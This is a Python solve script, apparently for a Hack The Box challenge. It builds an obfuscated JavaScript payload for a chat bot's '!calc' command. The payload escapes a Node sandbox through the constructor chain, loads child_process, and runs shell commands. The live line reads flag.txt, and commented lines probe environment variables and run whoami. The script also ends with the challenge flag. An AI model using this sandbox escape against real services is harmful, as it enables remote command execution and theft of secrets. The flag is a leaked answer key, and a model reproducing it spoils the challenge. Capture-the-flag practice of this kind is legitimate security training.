#!/usr/bin/env python


def call(s):
    return (
        # "this.constructor.constructor("
        "a=String.fromCharCode;this.constructor.constructor("
        + "+".join(["a(" + str(ord(x)) + ")" for x in s])
        # + "+".join(["String.fromCharCode(" + str(ord(x)) + ")" for x in s])
        # + "+".join(["(" + str(ord(x)) + ").toString()" for x in s])
        + ")()"
    )


# return Object.getOwnPropertyNames(this)
# print(call("return Object.keys(this.process.env)"))


# load modules with process.mainModule.constructor._load('child_process')

# only fs is already imported

# print("!calc " + call("return process.mainModule.constructor._load('fs')"))
# print("!calc " + call("return Object.getOwnPropertyNames(this)"))
# print("!calc " + call("return process.mainModule.constructor._load('child_process')"))
# print("!calc " + call("return Object.getOwnPropertyNames(fs)"))
# print("!calc " + call("return Object.getOwnPropertyNames(this)"))

### CODE EXECUTIONNNN

# print(
#     "!calc "
#     + call(
#         "return process.mainModule.constructor._load('child_process').spawnSync('whoami').stdout"
#     )
# )

# Don't forget you need the other arguments


print(
    "!calc "
    + call(
        "a=process.mainModule.constructor._load('child_process').spawnSync(`cat`, [`flag.txt`]); return a.stdout+a.stderr"
    )
)
# print("!calc " + call("return fs.open('flag')"))
# print("!calc " + call("return Object.getOwnPropertyNames(this)"))


# HTB{4lw4ys_RTFM!1}
